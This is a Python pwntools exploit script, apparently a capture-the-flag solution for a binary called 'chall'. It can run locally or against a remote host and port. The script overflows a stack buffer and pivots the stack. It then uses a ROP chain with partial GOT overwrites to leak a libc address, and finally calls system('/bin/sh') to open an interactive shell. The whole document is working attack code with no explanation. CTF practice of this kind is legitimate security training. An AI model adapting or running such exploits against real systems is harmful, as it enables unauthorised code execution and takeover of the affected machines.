#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chall")
libc = e.libc
gs = """
b *0x4011B7
b *0x0000000000401155
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
        p.recvuntil(b'disabled ==\n')
    return p


p = start()

e.sym.main = 0x4011B8

p.sendline(
    b'X'*96+p64(e.bss(0x800)) +
    p64(0x40119A)
)

pause()

p.send(
    b'A'*96+p64(e.got.fgets+8) +
    p64(0x401172) +
    p64(e.sym.main)[:3]
)

pause()

p.send(
    (
        p64(0x40117B)
    )
)

pause()

RSI_RET = 0x401165
RDI_eq_RSI = 0x40115a
RBP_RET = 0x000000000040115e
RAX_ZERO_RET = 0x40118B
# mov dl, byte ptr [rbp + 0x48] ; mov ebp, esp ; mov rdi, rsi ; ret
SET_DL = 0x0000000000401155


p.send(
    b'A'*96+p64(0xff) +

    p64(RSI_RET)+p64(0) +
    p64(RBP_RET)+p64(0x404840-0x48) +
    p64(SET_DL) +
    p64(RSI_RET)+p64(e.got.read) +
    p64(e.plt.read) +

    p64(RSI_RET) + p64(1) + p64(RDI_eq_RSI) +
    p64(RSI_RET) + p64(e.got.read) +
    p64(e.plt.read) +

    p64(RAX_ZERO_RET) +
    p64(RSI_RET) + p64(0) + p64(RDI_eq_RSI) +
    p64(RSI_RET)+p64(0x4048f0) +

    p64(e.plt.read)
)

pause()

p.send(b'\xe0')

libc.address = u64(p.recv(8)) - (libc.sym.read+16)
log.success(hex(libc.address))

pause()

p.send(
    p64(RSI_RET) + p64(next(libc.search(b'/bin/sh'))) + p64(RDI_eq_RSI) +
    p64(RSI_RET+1) +
    p64(libc.sym.system)
)

p.interactive()
